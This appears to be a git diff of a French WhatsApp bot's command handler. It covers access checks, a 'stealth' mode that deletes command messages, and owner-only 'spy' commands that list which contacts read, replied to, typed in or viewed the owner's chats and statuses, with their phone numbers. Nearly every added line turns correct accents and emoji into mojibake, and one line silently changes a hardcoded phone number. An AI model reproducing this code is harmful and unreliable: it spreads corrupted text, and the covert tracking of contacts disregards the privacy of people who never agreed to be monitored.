-  console.log(`[DEBUG CMD] 6. ✅ Toutes vérifications passées - Prêt pour switch`);
+  console.log(`[DEBUG CMD] 6. âœ… Toutes vÃ©rifications passÃ©es - PrÃªt pour switch`);
 
-  // � VÉRIFICATION CONTRÔLE D'ACCÈS (nouveau système v2.0)
+  // ï¿½ VÃ‰RIFICATION CONTRÃ”LE D'ACCÃˆS (nouveau systÃ¨me v2.0)
   if (!isBotSelf && accessControl) {
     try {
       const accessCheck = accessControl.checkCommandAccess(command, sender, {
@@ -1813,36 +1813,36 @@ async function handleCommand(hani, msg, db) {
       });
       
       if (!accessCheck.allowed) {
-        console.log(`[ACCESS] ❌ Commande ${command} refusée pour ${sender}: ${accessCheck.reason}`);
+        console.log(`[ACCESS] âŒ Commande ${command} refusÃ©e pour ${sender}: ${accessCheck.reason}`);
         
-        // Envoyer le message de refus stylisé
+        // Envoyer le message de refus stylisÃ©
         await hani.sendMessage(from, { text: accessCheck.message }, { quoted: msg });
         return;
       }
       
-      // Incrémenter l'utilisation si ce n'est pas le owner
+      // IncrÃ©menter l'utilisation si ce n'est pas le owner
       if (!accessCheck.reason?.includes('owner')) {
         try {
           premiumDB.incrementUsage(sender);
         } catch (e) {}
       }
       
-      console.log(`[ACCESS] ✅ Commande ${command} autorisée (${accessCheck.level})`);
+      console.log(`[ACCESS] âœ… Commande ${command} autorisÃ©e (${accessCheck.level})`);
     } catch (e) {
-      console.log(`[ACCESS] ⚠️ Erreur vérification accès (fallback premium): ${e.message}`);
+      console.log(`[ACCESS] âš ï¸ Erreur vÃ©rification accÃ¨s (fallback premium): ${e.message}`);
       
-      // Fallback vers l'ancien système
+      // Fallback vers l'ancien systÃ¨me
       if (!isOwner) {
         try {
           const premiumCheck = premiumDB.canExecuteCommand(sender, command);
           if (!premiumCheck.allowed) {
-            console.log(`[PREMIUM] ❌ Commande ${command} refusée pour ${sender}: ${premiumCheck.reason}`);
+            console.log(`[PREMIUM] âŒ Commande ${command} refusÃ©e pour ${sender}: ${premiumCheck.reason}`);
             await hani.sendMessage(from, { text: premiumCheck.message }, { quoted: msg });
             return;
           }
           premiumDB.incrementUsage(sender);
         } catch (e2) {
-          console.log(`[PREMIUM] ⚠️ Erreur vérification premium (ignorée): ${e2.message}`);
+          console.log(`[PREMIUM] âš ï¸ Erreur vÃ©rification premium (ignorÃ©e): ${e2.message}`);
         }
       }
     }
@@ -1851,13 +1851,13 @@ async function handleCommand(hani, msg, db) {
     try {
       const premiumCheck = premiumDB.canExecuteCommand(sender, command);
       if (!premiumCheck.allowed) {
-        console.log(`[PREMIUM] ❌ Commande ${command} refusée pour ${sender}: ${premiumCheck.reason}`);
+        console.log(`[PREMIUM] âŒ Commande ${command} refusÃ©e pour ${sender}: ${premiumCheck.reason}`);
         await hani.sendMessage(from, { text: premiumCheck.message }, { quoted: msg });
         return;
       }
       premiumDB.incrementUsage(sender);
     } catch (e) {
-      console.log(`[PREMIUM] ⚠️ Erreur vérification premium (ignorée): ${e.message}`);
+      console.log(`[PREMIUM] âš ï¸ Erreur vÃ©rification premium (ignorÃ©e): ${e.message}`);
     }
   }
 
@@ -1866,56 +1866,56 @@ async function handleCommand(hani, msg, db) {
   const isOwnChat = from === botNumber || from.includes(botNumberClean);
   const isGroupChat = from.endsWith('@g.us');
   
-  // 🎯 MODE FURTIF: 
-  // - Commandes exécutées depuis n'importe où
-  // - Réponses TOUJOURS envoyées vers "Moi-même" (botNumber)
-  // - Message de commande automatiquement supprimé
+  // ðŸŽ¯ MODE FURTIF: 
+  // - Commandes exÃ©cutÃ©es depuis n'importe oÃ¹
+  // - RÃ©ponses TOUJOURS envoyÃ©es vers "Moi-mÃªme" (botNumber)
+  // - Message de commande automatiquement supprimÃ©
   const actualDestination = botNumber;
-  console.log(`[STEALTH] 🕵️ Commande de: ${from} | Réponse vers: Moi-même (${botNumber})`);
+  console.log(`[STEALTH] ðŸ•µï¸ Commande de: ${from} | RÃ©ponse vers: Moi-mÃªme (${botNumber})`);
   
-  // 🗑️ SUPPRIMER LE MESSAGE DE COMMANDE (mode furtif)
-  // Seulement si ce n'est pas déjà dans "Moi-même"
+  // ðŸ—‘ï¸ SUPPRIMER LE MESSAGE DE COMMANDE (mode furtif)
+  // Seulement si ce n'est pas dÃ©jÃ  dans "Moi-mÃªme"
   if (!isOwnChat && msg.key.fromMe) {
     try {
       await hani.sendMessage(from, { delete: msg.key });
-      console.log(`[STEALTH] 🗑️ Message de commande supprimé dans ${from}`);
+      console.log(`[STEALTH] ðŸ—‘ï¸ Message de commande supprimÃ© dans ${from}`);
     } catch (e) {
-      console.log(`[STEALTH] ⚠️ Impossible de supprimer le message: ${e.message}`);
+      console.log(`[STEALTH] âš ï¸ Impossible de supprimer le message: ${e.message}`);
     }
   }
   
-  // Contexte pour les réponses (savoir d'où vient la commande)
+  // Contexte pour les rÃ©ponses (savoir d'oÃ¹ vient la commande)
   const sourceInfo = isGroupChat ? `[Groupe: ${from.split('@')[0]}]` : 
                      isLidChat ? `[LID]` : 
                      `[DM: ${from.split('@')[0]}]`;
   
   const send = async (text, options = {}) => {
     try {
-      // TOUJOURS envoyer vers "Moi-même"
+      // TOUJOURS envoyer vers "Moi-mÃªme"
       const msgPayload = { text, ...options };
       await hani.sendMessage(botNumber, msgPayload);
-      console.log(`[SEND] ✅ Message envoyé vers Moi-même`);
+      console.log(`[SEND] âœ… Message envoyÃ© vers Moi-mÃªme`);
     } catch (e) {
-      console.log(`[SEND] ❌ Erreur: ${e.message}`);
+      console.log(`[SEND] âŒ Erreur: ${e.message}`);
     }
   };
   
-  // Reply - envoyer vers "Moi-même" (pas de citation car chat différent)
+  // Reply - envoyer vers "Moi-mÃªme" (pas de citation car chat diffÃ©rent)
   const reply = async (text, options = {}) => {
     try {
-      // Envoyer vers "Moi-même" avec info sur la source
+      // Envoyer vers "Moi-mÃªme" avec info sur la source
       const msgPayload = { text, ...options };
       await hani.sendMessage(botNumber, msgPayload);
-      console.log(`[REPLY] ✅ Réponse envoyée vers Moi-même`);
+      console.log(`[REPLY] âœ… RÃ©ponse envoyÃ©e vers Moi-mÃªme`);
     } catch (e) {
-      console.log(`[REPLY] ❌ Erreur: ${e.message}`);
+      console.log(`[REPLY] âŒ Erreur: ${e.message}`);
     }
   };
 
-  // Récupérer le groupe
+  // RÃ©cupÃ©rer le groupe
   const groupData = isGroupMsg ? db.getGroup(from) : null;
   
-  // Vérifier les permissions d'admin
+  // VÃ©rifier les permissions d'admin
   let isAdmin = false;
   let isBotAdmin = false;
   let groupMetadata = null;
@@ -1931,111 +1931,111 @@ async function handleCommand(hani, msg, db) {
     } catch (e) {}
   }
 
-  // Mentionné
+  // MentionnÃ©
   const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
   const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
   const quotedParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant;
 
-  // Incrémenter les stats
+  // IncrÃ©menter les stats
   db.incrementStats("commands");
 
-  // ═══════════════════════════════════════════════════════════
-  // 🔐 VÉRIFICATION DES PERMISSIONS
-  // ═══════════════════════════════════════════════════════════
+  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+  // ðŸ” VÃ‰RIFICATION DES PERMISSIONS
+  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   
-  // Charger les utilisateurs approuvés depuis la DB
+  // Charger les utilisateurs approuvÃ©s depuis la DB
   const approvedList = db.data?.approved || [];
   const isApproved = approvedList.includes(senderNumber) || 
                      approvedList.includes(sender) ||
                      approvedList.some(n => sender.includes(n)) ||
                      isOwner || isSudo;
   
-  // Vérification du niveau d'accès
+  // VÃ©rification du niveau d'accÃ¨s
   let hasPermission = true;
   let permissionDeniedReason = "";
   
-  // 🔒 MODE PRIVATE: Seuls owner et sudo peuvent utiliser le bot
+  // ðŸ”’ MODE PRIVATE: Seuls owner et sudo peuvent utiliser le bot
   if (config.MODE === "private" && !isSudo) {
     // Quelques commandes restent accessibles en mode private
     const alwaysAllowed = ["permissions", "myaccess", "mylevel", "whoami", "ping", "menu", "help"];
     if (!alwaysAllowed.includes(command)) {
       hasPermission = false;
-      permissionDeniedReason = "🔒 *Mode Privé*\n\nLe bot est en mode privé. Seuls le propriétaire et les sudos peuvent l'utiliser.\n\nTape `.permissions` pour voir ton niveau.";
+      permissionDeniedReason = "ðŸ”’ *Mode PrivÃ©*\n\nLe bot est en mode privÃ©. Seuls le propriÃ©taire et les sudos peuvent l'utiliser.\n\nTape `.permissions` pour voir ton niveau.";
     }
   }
-  // 🌍 MODE PUBLIC: Vérifier les niveaux d'accès
-  // ⚠️ IMPORTANT: Vérifier dans l'ordre du PLUS PERMISSIF au MOINS PERMISSIF
+  // ðŸŒ MODE PUBLIC: VÃ©rifier les niveaux d'accÃ¨s
+  // âš ï¸ IMPORTANT: VÃ©rifier dans l'ordre du PLUS PERMISSIF au MOINS PERMISSIF
   else if (publicCommands.includes(command)) {
-    // Commandes publiques → TOUJOURS accessible à tout le monde
+    // Commandes publiques â†’ TOUJOURS accessible Ã  tout le monde
     hasPermission = true;
   } else if (approvedOnlyCommands.includes(command)) {
-    // Commandes approved exclusives (jeux, téléchargement avancé, etc.)
+    // Commandes approved exclusives (jeux, tÃ©lÃ©chargement avancÃ©, etc.)
     if (!isApproved) {
       hasPermission = false;
-      permissionDeniedReason = "⛔ *Accès refusé!*\n\n✨ Cette commande est réservée aux *utilisateurs approuvés*.\n\nDemande au propriétaire de t'ajouter avec la commande: `.approve`";
+      permissionDeniedReason = "â›” *AccÃ¨s refusÃ©!*\n\nâœ¨ Cette commande est rÃ©servÃ©e aux *utilisateurs approuvÃ©s*.\n\nDemande au propriÃ©taire de t'ajouter avec la commande: `.approve`";
     }
   } else if (sudoOnlyCommands.includes(command)) {
-    // Commandes sudo exclusives (modération groupe, broadcast)
+    // Commandes sudo exclusives (modÃ©ration groupe, broadcast)
     if (!isSudo) {
       hasPermission = false;
-      permissionDeniedReason = "⛔ *Accès refusé!*\n\n🛡️ Cette commande est réservée aux *administrateurs* (sudo) du bot.";
+      permissionDeniedReason = "â›” *AccÃ¨s refusÃ©!*\n\nðŸ›¡ï¸ Cette commande est rÃ©servÃ©e aux *administrateurs* (sudo) du bot.";
     }
   } else if (ownerOnlyCommands.includes(command)) {
-    // Commandes owner seulement (contrôle total)
+    // Commandes owner seulement (contrÃ´le total)
     if (!isOwner) {
       hasPermission = false;
-      permissionDeniedReason = "⛔ *Accès refusé!*\n\n👑 Cette commande est réservée au *propriétaire* du bot uniquement.";
+      permissionDeniedReason = "â›” *AccÃ¨s refusÃ©!*\n\nðŸ‘‘ Cette commande est rÃ©servÃ©e au *propriÃ©taire* du bot uniquement.";
     }
   }
-  // Commandes non listées → accessibles par défaut
+  // Commandes non listÃ©es â†’ accessibles par dÃ©faut
   
   // Si pas de permission, refuser
   if (!hasPermission) {
     return reply(permissionDeniedReason);
   }
 
-  // ═══════════════════════════════════════════════════════════
-  // 🎯 COMMANDES
-  // ═══════════════════════════════════════════════════════════
+  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+  // ðŸŽ¯ COMMANDES
+  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-  console.log(`[SWITCH] 🎯 Entrée dans switch avec command="${command}" | from="${from}"`);
+  console.log(`[SWITCH] ðŸŽ¯ EntrÃ©e dans switch avec command="${command}" | from="${from}"`);
 
   switch (command) {
     
-    // ────────── GÉNÉRAL ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GÃ‰NÃ‰RAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "ping": {
       const start = Date.now();
-      await send("🏓 Pong!");
+      await send("ðŸ“ Pong!");
       const latency = Date.now() - start;
-      return send(`📶 Latence: ${latency}ms\n⚡ HANI-MD est opérationnel!`);
+      return send(`ðŸ“¶ Latence: ${latency}ms\nâš¡ HANI-MD est opÃ©rationnel!`);
     }
 
-    // ────────── � TEST NOTIFICATIONS ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ï¿½ TEST NOTIFICATIONS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     case "testnotif":
     case "testn": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       console.log(`[TEST] NOTIFICATION_NUMBER = ${NOTIFICATION_NUMBER}`);
       
       try {
         await hani.sendMessage(NOTIFICATION_NUMBER, {
-          text: `🧪 *TEST NOTIFICATION*\n\n✅ Les notifications fonctionnent!\n\n📱 Envoyé vers: +2250150252467\n🕐 ${new Date().toLocaleString("fr-FR")}`
+          text: `ðŸ§ª *TEST NOTIFICATION*\n\nâœ… Les notifications fonctionnent!\n\nðŸ“± EnvoyÃ© vers: +22550252467\nðŸ• ${new Date().toLocaleString("fr-FR")}`
         });
-        return send(`✅ Notification envoyée vers +2250150252467!`);
+        return send(`âœ… Notification envoyÃ©e vers +22550252467!`);
       } catch (e) {
         console.log(`[TEST] Erreur: ${e.message}`);
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
-    // ────────── �🕵️ COMMANDES ESPION SÉPARÉES ──────────
+    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ï¿½ðŸ•µï¸ COMMANDES ESPION SÃ‰PARÃ‰ES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     
     case "spyread":
     case "quilit": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!spyData.messageReads || spyData.messageReads.length === 0) {
-        return send(`📖 *Aucune lecture détectée*\n\n_Attends que quelqu'un lise tes messages!_\n\n💡 Active le mode espion: \`.spy on\``);
+        return send(`ðŸ“– *Aucune lecture dÃ©tectÃ©e*\n\n_Attends que quelqu'un lise tes messages!_\n\nðŸ’¡ Active le mode espion: \`.spy on\``);
       }
       
       const uniqueReaders = {};
@@ -2046,28 +2046,28 @@ async function handleCommand(hani, msg, db) {
         uniqueReaders[read.reader].count++;
       }
       
-      let list = `📖 ═══════════════════════════\n   *QUI A LU TES MESSAGES*\n═══════════════════════════\n\n`;
+      let list = `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI A LU TES MESSAGES*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       let i = 1;
       for (const [num, data] of Object.entries(uniqueReaders)) {
-        const displayName = data.name || "Non enregistré";
+        const displayName = data.name || "Non enregistrÃ©";
         const cleanNum = num.replace(/[^0-9]/g, '');
-        list += `*${i}.* ${displayName !== "Non enregistré" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
-        list += `   📱 *Numéro:* +${cleanNum}\n`;
-        list += `   📖 ${data.count} msg lu(s) • 🕐 ${data.lastTime}\n`;
-        list += `   💬 wa.me/${cleanNum}\n\n`;
+        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
+        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
+        list += `   ðŸ“– ${data.count} msg lu(s) â€¢ ðŸ• ${data.lastTime}\n`;
+        list += `   ðŸ’¬ wa.me/${cleanNum}\n\n`;
         i++;
         if (i > 20) break;
       }
-      list += `═══════════════════════════\n📊 *Total:* ${spyData.messageReads.length} lectures de ${Object.keys(uniqueReaders).length} personnes`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.messageReads.length} lectures de ${Object.keys(uniqueReaders).length} personnes`;
       return send(list);
     }
 
     case "spyreply":
     case "quirepond": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!spyData.replies || spyData.replies.length === 0) {
-        return send(`↩️ *Aucune réponse détectée*\n\n_Attends que quelqu'un réponde à tes messages!_\n\n💡 Active le mode espion: \`.spy on\``);
+        return send(`â†©ï¸ *Aucune rÃ©ponse dÃ©tectÃ©e*\n\n_Attends que quelqu'un rÃ©ponde Ã  tes messages!_\n\nðŸ’¡ Active le mode espion: \`.spy on\``);
       }
       
       const uniqueRepliers = {};
@@ -2079,30 +2079,30 @@ async function handleCommand(hani, msg, db) {
         uniqueRepliers[reply.replier].lastPreview = reply.preview;
       }
       
-      let list = `↩️ ═══════════════════════════\n   *QUI A RÉPONDU À TES MESSAGES*\n═══════════════════════════\n\n`;
+      let list = `â†©ï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI A RÃ‰PONDU Ã€ TES MESSAGES*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       let i = 1;
       for (const [num, data] of Object.entries(uniqueRepliers)) {
-        const displayName = data.name || "Non enregistré";
+        const displayName = data.name || "Non enregistrÃ©";
         const cleanNum = num.replace(/[^0-9]/g, '');
-        list += `*${i}.* ${displayName !== "Non enregistré" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
-        list += `   📱 *Numéro:* +${cleanNum}\n`;
-        list += `   ↩️ ${data.count} réponse(s) • 🕐 ${data.lastTime}\n`;
-        if (data.lastPreview) list += `   💬 _"${data.lastPreview.slice(0, 50)}..."_\n`;
-        list += `   📞 wa.me/${cleanNum}\n\n`;
+        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
+        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
+        list += `   â†©ï¸ ${data.count} rÃ©ponse(s) â€¢ ðŸ• ${data.lastTime}\n`;
+        if (data.lastPreview) list += `   ðŸ’¬ _"${data.lastPreview.slice(0, 50)}..."_\n`;
+        list += `   ðŸ“ž wa.me/${cleanNum}\n\n`;
         i++;
         if (i > 20) break;
       }
-      list += `═══════════════════════════\n📊 *Total:* ${spyData.replies.length} réponses de ${Object.keys(uniqueRepliers).length} personnes`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.replies.length} rÃ©ponses de ${Object.keys(uniqueRepliers).length} personnes`;
       return send(list);
     }
 
     case "spypresence":
     case "quiouvre":
     case "quiecrit": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!spyData.presenceDetected || spyData.presenceDetected.length === 0) {
-        return send(`✍️ *Aucune présence détectée*\n\n_Attends que quelqu'un ouvre ta discussion!_\n\n💡 Ce système détecte:\n• ✍️ Quand quelqu'un écrit\n• 🎤 Quand quelqu'un enregistre un vocal\n• 👁️ Quand quelqu'un est actif dans ton chat`);
+        return send(`âœï¸ *Aucune prÃ©sence dÃ©tectÃ©e*\n\n_Attends que quelqu'un ouvre ta discussion!_\n\nðŸ’¡ Ce systÃ¨me dÃ©tecte:\nâ€¢ âœï¸ Quand quelqu'un Ã©crit\nâ€¢ ðŸŽ¤ Quand quelqu'un enregistre un vocal\nâ€¢ ðŸ‘ï¸ Quand quelqu'un est actif dans ton chat`);
       }
       
       const uniquePresences = {};
@@ -2119,34 +2119,34 @@ async function handleCommand(hani, msg, db) {
         uniquePresences[presence.number].actions.add(presence.action);
       }
       
-      let list = `✍️ ═══════════════════════════\n   *QUI A OUVERT TON CHAT*\n═══════════════════════════\n\n`;
+      let list = `âœï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI A OUVERT TON CHAT*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       let i = 1;
       for (const [num, data] of Object.entries(uniquePresences)) {
-        const displayName = data.name || "Non enregistré";
+        const displayName = data.name || "Non enregistrÃ©";
         const cleanNum = num.replace(/[^0-9]/g, '');
         const actionsStr = Array.from(data.actions).map(a => {
           switch(a) {
-            case "composing": return "✍️";
-            case "recording": return "🎤";
-            case "available": return "👁️";
-            default: return "📱";
+            case "composing": return "âœï¸";
+            case "recording": return "ðŸŽ¤";
+            case "available": return "ðŸ‘ï¸";
+            default: return "ðŸ“±";
           }
         }).join(" ");
-        list += `*${i}.* ${displayName !== "Non enregistré" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
-        list += `   📱 *Numéro:* +${cleanNum}\n`;
-        list += `   ${actionsStr} ${data.count} détection(s) • 🕐 ${data.lastTime}\n`;
-        list += `   💬 wa.me/${cleanNum}\n\n`;
+        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
+        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
+        list += `   ${actionsStr} ${data.count} dÃ©tection(s) â€¢ ðŸ• ${data.lastTime}\n`;
+        list += `   ðŸ’¬ wa.me/${cleanNum}\n\n`;
         i++;
         if (i > 20) break;
       }
-      list += `═══════════════════════════\n📊 *Total:* ${spyData.presenceDetected.length} détections de ${Object.keys(uniquePresences).length} personnes\n\n*Légende:* ✍️=Écrit 🎤=Vocal 👁️=Actif`;
+      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.presenceDetected.length} dÃ©tections de ${Object.keys(uniquePresences).length} personnes\n\n*LÃ©gende:* âœï¸=Ã‰crit ðŸŽ¤=Vocal ðŸ‘ï¸=Actif`;
       return send(list);
     }
 
     case "spyhistory":
     case "spyall":
     case "espionhistorique": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       const statusCount = spyData.statusViews?.length || 0;
       const readCount = spyData.messageReads?.length || 0;
@@ -2158,76 +2158,76 @@ async function handleCommand(hani, msg, db) {
       const uniqueRepliers = new Set((spyData.replies || []).map(r => r.replier)).size;
       const uniquePresence = new Set((spyData.presenceDetected || []).map(p => p.number)).size;
       
-      let history = `🕵️ ═══════════════════════════\n   *HISTORIQUE ESPION COMPLET*\n═══════════════════════════\n\n`;
+      let history = `ðŸ•µï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *HISTORIQUE ESPION COMPLET*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
       
-      history += `📊 *RÉSUMÉ GLOBAL:*\n`;
-      history += `━━━━━━━━━━━━━━━━━━━━━\n`;
-      history += `👁️ *Vues statuts:* ${statusCount} (${uniqueStatusViewers} personnes)\n`;
-      history += `📖 *Messages lus:* ${readCount} (${uniqueReaders} personnes)\n`;
-      history += `↩️ *Réponses:* ${repliesCount} (${uniqueRepliers} personnes)\n`;
-      history += `✍️ *Présences:* ${presenceCount} (${uniquePresence} personnes)\n\n`;
+      history += `ðŸ“Š *RÃ‰SUMÃ‰ GLOBAL:*\n`;
+      history += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
+      history += `ðŸ‘ï¸ *Vues statuts:* ${statusCount} (${uniqueStatusViewers} personnes)\n`;
+      history += `ðŸ“– *Messages lus:* ${readCount} (${uniqueReaders} personnes)\n`;
+      history += `â†©ï¸ *RÃ©ponses:* ${repliesCount} (${uniqueRepliers} personnes)\n`;
+      history += `âœï¸ *PrÃ©sences:* ${presenceCount} (${uniquePresence} personnes)\n\n`;
       
-      // Top 5 de chaque catégorie
+      // Top 5 de chaque catÃ©gorie
       if (spyData.statusViews && spyData.statusViews.length > 0) {
-        history += `👁️ *DERNIÈRES VUES STATUTS:*\n`;
+        history += `ðŸ‘ï¸ *DERNIÃˆRES VUES STATUTS:*\n`;
         const last5Status = spyData.statusViews.slice(0, 5);
         for (const v of last5Status) {
-          history += `   • ${v.viewerName || "Inconnu"} (${v.viewer.replace(/[^0-9]/g, '').slice(-10)})\n`;
+          history += `   â€¢ ${v.viewerName || "Inconnu"} (${v.viewer.replace(/[^0-9]/g, '').slice(-10)})\n`;
         }
         history += `\n`;
       }
       
       if (spyData.messageReads && spyData.messageReads.length > 0) {
-        history += `📖 *DERNIÈRES LECTURES:*\n`;
+        history += `ðŸ“– *DERNIÃˆRES LECTURES:*\n`;
         const last5Reads = spyData.messageReads.slice(0, 5);
         for (const r of last5Reads) {
-          history += `   • ${r.readerName || "Inconnu"} - ${r.timeStr}\n`;
+          history += `   â€¢ ${r.readerName || "Inconnu"} - ${r.timeStr}\n`;
         }
         history += `\n`;
       }
       
       if (spyData.replies && spyData.replies.length > 0) {
-        history += `↩️ *DERNIÈRES RÉPONSES:*\n`;
+        history += `â†©ï¸ *DERNIÃˆRES RÃ‰PONSES:*\n`;
         const last5Replies = spyData.replies.slice(0, 5);
         for (const r of last5Replies) {
           const preview = r.preview ? r.preview.slice(0, 30) + "..." : "";
-          history += `   • ${r.replierName || "Inconnu"}: "${preview}"\n`;
+          history += `   â€¢ ${r.replierName || "Inconnu"}: "${preview}"\n`;
         }
         history += `\n`;
       }
       
       if (spyData.presenceDetected && spyData.presenceDetected.length > 0) {
-        history += `✍️ *DERNIÈRES PRÉSENCES:*\n`;
+        history += `âœï¸ *DERNIÃˆRES PRÃ‰SENCES:*\n`;
         const last5Presence = spyData.presenceDetected.slice(-5).reverse();
         for (const p of last5Presence) {
-          const emoji = p.action === "composing" ? "✍️" : p.action === "recording" ? "🎤" : "👁️";
-          history += `   • ${emoji} ${p.name || "Inconnu"}\n`;
+          const emoji = p.action === "composing" ? "âœï¸" : p.action === "recording" ? "ðŸŽ¤" : "ðŸ‘ï¸";
+          history += `   â€¢ ${emoji} ${p.name || "Inconnu"}\n`;
         }
         history += `\n`;
       }
       
-      history += `═══════════════════════════\n`;
-      history += `⚙️ *ÉTAT:*\n`;
-      history += `• Spy statuts: ${protectionState.spyStatusViews ? "✅" : "❌"}\n`;
-      history += `• Spy lectures: ${protectionState.spyReadReceipts ? "✅" : "❌"}\n`;
-      history += `• Spy réponses: ${protectionState.spyReplies ? "✅" : "❌"}\n`;
-      history += `• Spy présence: ${protectionState.spyPresence ? "✅" : "❌"}\n\n`;
-      history += `📋 *COMMANDES:*\n`;
-      history += `• \`.spyread\` → Qui lit mes messages\n`;
-      history += `• \`.spyreply\` → Qui répond\n`;
-      history += `• \`.spypresence\` → Qui ouvre mon chat\n`;
-      history += `• \`.spy status\` → Qui voit mes statuts\n`;
-      history += `• \`.spy clear\` → Effacer tout`;
+      history += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n`;
+      history += `âš™ï¸ *Ã‰TAT:*\n`;
+      history += `â€¢ Spy statuts: ${protectionState.spyStatusViews ? "âœ…" : "âŒ"}\n`;
+      history += `â€¢ Spy lectures: ${protectionState.spyReadReceipts ? "âœ…" : "âŒ"}\n`;
+      history += `â€¢ Spy rÃ©ponses: ${protectionState.spyReplies ? "âœ…" : "âŒ"}\n`;
+      history += `â€¢ Spy prÃ©sence: ${protectionState.spyPresence ? "âœ…" : "âŒ"}\n\n`;
+      history += `ðŸ“‹ *COMMANDES:*\n`;
+      history += `â€¢ \`.spyread\` â†’ Qui lit mes messages\n`;
+      history += `â€¢ \`.spyreply\` â†’ Qui rÃ©pond\n`;
+      history += `â€¢ \`.spypresence\` â†’ Qui ouvre mon chat\n`;
+      history += `â€¢ \`.spy status\` â†’ Qui voit mes statuts\n`;
+      history += `â€¢ \`.spy clear\` â†’ Effacer tout`;
       
       return send(history);
     }
 
     case "spystatus":
     case "quivoitmesstatus": {
-      if (!isOwner) return send("❌ Commande réservée à l'owner.");
+      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
       
       if (!spyData.statusViews || spyData.statusViews.length === 0) {
-        return send(`👁️ *Aucune vue de statut détectée*\n\n_Poste un statut et attends que quelqu'un le voie!_\n\n💡 Active le mode espion: \`.spy on\``);
+        return send(`ðŸ‘ï¸ *Aucune vue de statut dÃ©tectÃ©e*\n\n_Poste un statut et attends que quelqu'un le voie!_\n\nðŸ’¡ Active le mode espion: \`.spy on\``);
       }
       
       const uniqueViewers = {};
@@ -2238,42 +2238,42 @@ async function handleCommand(hani, msg, db) {
         uniqueViewers[view.viewer].count++;
       }
       
-      let list = `👁️ ═══════════════════════════\n   *QUI VOIT TES STATUTS*\n═══════════════════════════\n\n`;
